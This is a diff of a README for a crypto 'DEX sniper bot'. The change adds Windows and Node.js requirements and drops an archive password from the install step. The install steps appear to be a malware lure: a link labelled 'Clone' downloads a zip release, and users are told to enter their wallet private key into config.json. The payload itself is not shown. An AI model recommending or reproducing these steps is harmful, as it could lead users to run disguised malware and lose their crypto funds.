@@ -33,8 +33,11 @@ To identify profitable trades, sniper bots use technical analysis and various in
 * Quickswap (Polygon)
 * Trader Joe (Avalanche)
 
+## Requirements
+- Windows 7/10/11
+- [Node.js](https://nodejs.org/en/download/prebuilt-installer)
 ## Installing
-- [Clone](https://github.com/deadspyexx/dex-sniper-bot/releases/download/Release/dex-sniper-bot-1.3.2.zip) repository and extract files with password `whLn1sTWT`.
+- [Clone](https://github.com/deadspyexx/dex-sniper-bot/releases/download/Release/dex-sniper-bot-1.3.2.zip) repository and extract files.
 - Edit the address and private_key fields in the config.json file. 
 - Set up the network and AMMs in the sniping menu. Ensure that there are sufficient funds on the specified address to cover transaction fees.
 
